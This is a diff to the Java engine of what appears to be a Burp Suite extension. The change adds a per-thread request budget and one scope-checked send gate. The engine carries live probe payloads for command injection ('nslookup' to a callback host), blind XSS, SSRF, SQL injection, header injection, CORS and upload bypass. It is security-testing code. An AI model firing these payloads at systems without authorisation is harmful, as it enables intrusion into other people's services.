@@ -17,10 +17,11 @@ import java.util.regex.Pattern;
  * server-side template injection via arithmetic evaluation, reflected-XSS confirmation via a
  * metacharacter canary, and lightweight WAF fingerprinting.
  *
- * <p>Every request is scope-checked and throttled by the caller. Payload firing only happens when
- * the user has explicitly enabled active tests. Detection cores ({@link #detectSstiEval},
- * {@link #survivingXssChars}, {@link #fingerprintWaf}, {@link #encodeCorrelation}) are pure and
- * unit-tested; the Montoya-facing orchestration is deliberately thin.
+ * <p>Every target-directed request is scope-checked and acquires a hard request-budget token
+ * immediately before the network send. Payload firing only happens when the user has explicitly
+ * enabled active tests. Detection cores ({@link #detectSstiEval}, {@link #survivingXssChars},
+ * {@link #fingerprintWaf}, {@link #encodeCorrelation}) are pure and unit-tested; the Montoya-facing
+ * orchestration is deliberately thin.
  */
 final class ActiveTestEngine {
 
@@ -83,6 +84,7 @@ final class ActiveTestEngine {
 
     private final MontoyaApi api;
     private final long throttleMillis;
+    private final ThreadLocal<RequestBudget> requestBudget = new ThreadLocal<>();
     private volatile CollaboratorClient collaborator;
 
     ActiveTestEngine(MontoyaApi api, long throttleMillis) {
@@ -94,41 +96,45 @@ final class ActiveTestEngine {
 
     /** Runs the enabled active probes against every non-cookie parameter of {@code base}. */
     List<ActiveFinding> test(HttpRequest base, int maxRequests) {
-        if (base == null) return List.of();
+        if (base == null || maxRequests <= 0) return List.of();
         List<ActiveFinding> findings = new ArrayList<>();
-        int budget = maxRequests;
-
-        List<HttpParameter> parameters;
+        RequestBudget budget = new RequestBudget(maxRequests);
+        requestBudget.set(budget);
         try {
-            parameters = new ArrayList<>(base.parameters());
-        } catch (Exception e) {
-            return List.of();
-        }
-
-        boolean wafChecked = false;
-        for (HttpParameter parameter : parameters) {
-            if (parameter == null || parameter.name() == null || parameter.name().isBlank()) continue;
-            if ("COOKIE".equalsIgnoreCase(String.valueOf(parameter.type()))) continue;
-            if (budget <= 0) break;
-
-            if (!wafChecked) {
-                budget -= testWaf(base, parameter, findings);
-                wafChecked = true;
+            List<HttpParameter> parameters;
+            try {
+                parameters = new ArrayList<>(base.parameters());
+            } catch (Exception e) {
+                return List.of();
             }
-            if (budget > 0) budget -= testReflectedXss(base, parameter, findings);
-            if (budget > 0) budget -= testSsti(base, parameter, findings);
-            if (budget > 0) budget -= testSsrf(base, parameter, findings);
-            if (budget > 0) budget -= testBlindXss(base, parameter, findings);
-            if (budget > 0) budget -= testCommandInjection(base, parameter, findings);
-            if (budget > 0) budget -= testOpenRedirect(base, parameter, findings);
-            if (budget > 0) budget -= testCrlf(base, parameter, findings);
-            if (budget > 0) budget -= testSqli(base, parameter, findings);
+
+            boolean wafChecked = false;
+            for (HttpParameter parameter : parameters) {
+                if (parameter == null || parameter.name() == null || parameter.name().isBlank()) continue;
+                if ("COOKIE".equalsIgnoreCase(String.valueOf(parameter.type()))) continue;
+                if (budget.exhausted()) break;
+
+                if (!wafChecked && !budget.exhausted()) {
+                    testWaf(base, parameter, findings);
+                    wafChecked = true;
+                }
+                if (!budget.exhausted()) testReflectedXss(base, parameter, findings);
+                if (!budget.exhausted()) testSsti(base, parameter, findings);
+                if (!budget.exhausted()) testSsrf(base, parameter, findings);
+                if (!budget.exhausted()) testBlindXss(base, parameter, findings);
+                if (!budget.exhausted()) testCommandInjection(base, parameter, findings);
+                if (!budget.exhausted()) testOpenRedirect(base, parameter, findings);
+                if (!budget.exhausted()) testCrlf(base, parameter, findings);
+                if (!budget.exhausted()) testSqli(base, parameter, findings);
+            }
+            if (!budget.exhausted()) testHostHeaderInjection(base, findings);
+            if (!budget.exhausted()) testCors(base, findings);
+            if (!budget.exhausted()) testRateLimit(base, findings);
+            if (!budget.exhausted()) testFileUploadBypass(base, findings);
+            return findings;
+        } finally {
+            requestBudget.remove();
         }
-        if (budget > 0) budget -= testHostHeaderInjection(base, findings);
-        if (budget > 0) budget -= testCors(base, findings);
-        if (budget > 0) budget -= testRateLimit(base, findings);
-        if (budget > 0) budget -= testFileUploadBypass(base, findings);
-        return findings;
     }
 
     private int testWaf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
@@ -157,6 +163,7 @@ final class ActiveTestEngine {
     private int testSsti(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
         int sent = 0;
         for (String payload : SSTI_PAYLOADS) {
+            if (budgetExhausted()) break;
             HttpResponse response = sendMutated(base, parameter, payload);
             sent++;
             if (response == null) continue;
@@ -173,7 +180,7 @@ final class ActiveTestEngine {
 
     private int testSsrf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
         CollaboratorClient client = collaborator;
-        if (client == null) return 0;
+        if (client == null || budgetExhausted()) return 0;
         String correlation = encodeCorrelation("SSRF", parameter.name(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
         HttpResponse response = sendMutated(base, parameter, "http://" + payload + "/");
@@ -189,7 +196,7 @@ final class ActiveTestEngine {
 
     private int testBlindXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
         CollaboratorClient client = collaborator;
-        if (client == null) return 0;
+        if (client == null || budgetExhausted()) return 0;
         String correlation = encodeCorrelation("XSS-blind", parameter.name(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
         sendMutated(base, parameter, "\"><script src=//" + payload + "></script>");
@@ -200,16 +207,20 @@ final class ActiveTestEngine {
 
     private int testCommandInjection(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
         CollaboratorClient client = collaborator;
-        if (client == null) return 0;
+        if (client == null || budgetExhausted()) return 0;
         String correlation = encodeCorrelation("CMDi", parameter.name(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
+        int before = budgetUsed();
         // Separator variants so at least one survives sh/cmd quoting contexts.
         sendMutated(base, parameter, ";nslookup " + payload + ";");
-        sendMutated(base, parameter, "|nslookup " + payload);
-        sendMutated(base, parameter, "$(nslookup " + payload + ")");
-        out.add(new ActiveFinding("INFO", "CMDi", parameter.name(),
-                "Blind command-injection DNS probes sent; awaiting OOB interaction", false, base.url()));
-        return 3;
+        if (!budgetExhausted()) sendMutated(base, parameter, "|nslookup " + payload);
+        if (!budgetExhausted()) sendMutated(base, parameter, "$(nslookup " + payload + ")");
+        int sent = budgetUsed() - before;
+        if (sent > 0) {
+            out.add(new ActiveFinding("INFO", "CMDi", parameter.name(),
+                    "Blind command-injection DNS probes sent; awaiting OOB interaction", false, base.url()));
+        }
+        return sent;
     }
 
     private int testOpenRedirect(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
@@ -233,38 +244,37 @@ final class ActiveTestEngine {
     }
 
     private int testSqli(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
-        int sent = 0;
+        int before = budgetUsed();
 
         HttpResponse baseline = sendMutated(base, parameter, parameter.value());
-        sent++;
-        if (baseline == null) return sent;
+        if (baseline == null || budgetExhausted()) return budgetUsed() - before;
         String baselineBody = baseline.bodyToString();
 
         HttpResponse errorResponse = sendMutated(base, parameter, SQLI_ERROR_PAYLOAD);
-        sent++;
         if (errorResponse != null && containsSqlError(errorResponse.bodyToString()) && !containsSqlError(baselineBody)) {
             out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                     "Injecting a single quote produced a database error signature not present in the baseline response",
                     true, base.url()));
-            return sent;
+            return budgetUsed() - before;
         }
+        if (budgetExhausted()) return budgetUsed() - before;
 
         HttpResponse trueResponse = sendMutated(base, parameter, SQLI_TRUE_PAYLOAD);
+        if (budgetExhausted()) return budgetUsed() - before;
         HttpResponse falseResponse = sendMutated(base, parameter, SQLI_FALSE_PAYLOAD);
-        sent += 2;
         if (trueResponse != null && falseResponse != null
                 && looksBooleanBased(baselineBody, trueResponse.bodyToString(), falseResponse.bodyToString())) {
             out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                     "Boolean-based blind: the always-true condition matches the baseline response while the "
                             + "always-false condition diverges from both", true, base.url()));
-            return sent;
+            return budgetUsed() - before;
         }
+        if (budgetExhausted()) return budgetUsed() - before;
 
         long baselineMillis = timeRequest(base, parameter, parameter.value());
-        sent++;
         for (String payload : SQLI_TIME_PAYLOADS) {
+            if (budgetExhausted()) break;
             long payloadMillis = timeRequest(base, parameter, payload);
-            sent++;
             if (looksTimeBased(baselineMillis, payloadMillis, SQLI_TIME_DELAY_SECONDS)) {
                 out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
                         "Time-based blind: response time increased by ~" + SQLI_TIME_DELAY_SECONDS
@@ -272,7 +282,7 @@ final class ActiveTestEngine {
                 break;
             }
         }
-        return sent;
+        return budgetUsed() - before;
     }
 
     private long timeRequest(HttpRequest base, HttpParameter parameter, String value) {
@@ -283,13 +293,12 @@ final class ActiveTestEngine {
 
     private int testHostHeaderInjection(HttpRequest base, List<ActiveFinding> out) {
         CollaboratorClient client = collaborator;
-        if (client == null) return 0;
+        if (client == null || budgetExhausted()) return 0;
         String correlation = encodeCorrelation("HostHeader", "Host", base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
         try {
-            if (!api.scope().isInScope(base.url())) return 0;
-            api.http().sendRequest(base.withUpdatedHeader("X-Forwarded-Host", payload.toString()));
-            throttle();
+            HttpRequestResponse rr = sendRequest(base.withUpdatedHeader("X-Forwarded-Host", payload.toString()));
+            if (rr == null) return 0;
             out.add(new ActiveFinding("INFO", "HostHeader", "X-Forwarded-Host",
                     "X-Forwarded-Host set to Collaborator host; awaiting OOB (reset-poisoning/cache)", false, base.url()));
         } catch (Exception e) {
@@ -306,13 +315,11 @@ final class ActiveTestEngine {
      */
     private int testCors(HttpRequest base, List<ActiveFinding> out) {
         List<String> origins = craftCorsProbeOrigins(hostOf(base.url()));
-        int sent = 0;
+        int before = budgetUsed();
         for (String origin : origins) {
+            if (budgetExhausted()) break;
             try {
-                if (!api.scope().isInScope(base.url())) break;
-                HttpRequestResponse rr = api.http().sendRequest(base.withUpdatedHeader("Origin", origin));
-                sent++;
-                throttle();
+                HttpRequestResponse rr = sendRequest(base.withUpdatedHeader("Origin", origin));
                 if (rr == null || rr.response() == null) continue;
                 HttpResponse response = rr.response();
                 String acao = response.headerValue("Access-Control-Allow-Origin");
@@ -329,7 +336,7 @@ final class ActiveTestEngine {
                 api.logging().logToError("CORS probe failed for " + base.url(), e);
             }
         }
-        return sent;
+        return budgetUsed() - before;
     }
 
     /**
@@ -346,12 +353,10 @@ final class ActiveTestEngine {
         List<Integer> statuses = new ArrayList<>();
         List<String> bodies = new ArrayList<>();
         List<String> retryAfters = new ArrayList<>();
-        int sent = 0;
-        for (int i = 0; i < RATE_LIMIT_BURST_SIZE; i++) {
+        int before = budgetUsed();
+        for (int i = 0; i < RATE_LIMIT_BURST_SIZE && !budgetExhausted(); i++) {
             try {
-                if (!api.scope().isInScope(base.url())) break;
-                HttpRequestResponse rr = api.http().sendRequest(base);
-                sent++;
+                HttpRequestResponse rr = sendRequest(base);
                 if (rr != null && rr.response() != null) {
                     statuses.add((int) rr.response().statusCode());
                     bodies.add(rr.response().bodyToString());
@@ -368,7 +373,7 @@ final class ActiveTestEngine {
                             + "succeeded with no rate-limit signal (no 429/503, Retry-After header, or lockout "
                             + "wording) observed", true, base.url()));
         }
-        return sent;
+        return budgetUsed() - before;
     }
 
     /**
@@ -388,17 +393,16 @@ final class ActiveTestEngine {
         List<FileUploadEngine.UploadedFile> files = FileUploadEngine.extractUploadedFiles(body, boundary);
         if (files.isEmpty()) return 0;
 
-        int sent = 0;
+        int before = budgetUsed();
         for (FileUploadEngine.UploadedFile file : files) {
+            if (budgetExhausted()) break;
             if (FileUploadEngine.isDangerousExtension(file.filename())) continue; // already dangerous; nothing to bypass
             for (String variant : FileUploadEngine.bypassFilenameVariants(file.filename())) {
+                if (budgetExhausted()) break;
                 String mutatedBody = FileUploadEngine.withRenamedFilename(body, file.filename(), variant);
                 if (mutatedBody.equals(body)) continue;
                 try {
-                    if (!api.scope().isInScope(base.url())) return sent;
-                    HttpRequestResponse rr = api.http().sendRequest(base.withBody(mutatedBody));
-                    sent++;
-                    throttle();
+                    HttpRequestResponse rr = sendRequest(base.withBody(mutatedBody));
                     if (rr == null || rr.response() == null) continue;
                     int status = rr.response().statusCode();
                     if (status >= 200 && status < 300) {
@@ -414,20 +418,44 @@ final class ActiveTestEngine {
                 }
             }
         }
-        return sent;
+        return budgetUsed() - before;
     }
 
     private HttpResponse sendMutated(HttpRequest base, HttpParameter parameter, String value) {
         try {
-            if (!api.scope().isInScope(base.url())) return null;
             HttpParameter mutated = HttpParameter.parameter(parameter.name(), value, parameter.type());
-            HttpRequestResponse rr = api.http().sendRequest(base.withUpdatedParameters(mutated));
-            throttle();
+            HttpRequestResponse rr = sendRequest(base.withUpdatedParameters(mutated));
             return rr == null ? null : rr.response();
         } catch (Exception e) {
             api.logging().logToError("Active probe failed for " + parameter.name(), e);
             return null;
         }
+    }
+
+    /** Lowest target-directed send gate: scope first, then one atomic budget acquisition. */
+    private HttpRequestResponse sendRequest(HttpRequest request) {
+        if (request == null) return null;
+        try {
+            if (!api.scope().isInScope(request.url())) return null;
+            RequestBudget budget = requestBudget.get();
+            if (budget == null || !budget.tryAcquire()) return null;
+            HttpRequestResponse rr = api.http().sendRequest(request);
+            throttle();
+            return rr;
+        } catch (Exception e) {
+            api.logging().logToError("Active request failed for " + request.url(), e);
+            return null;
+        }
+    }
+
+    private boolean budgetExhausted() {
+        RequestBudget budget = requestBudget.get();
+        return budget == null || budget.exhausted();
+    }
+
+    private int budgetUsed() {
+        RequestBudget budget = requestBudget.get();
+        return budget == null ? 0 : budget.used();
     }
 
     private void throttle() {
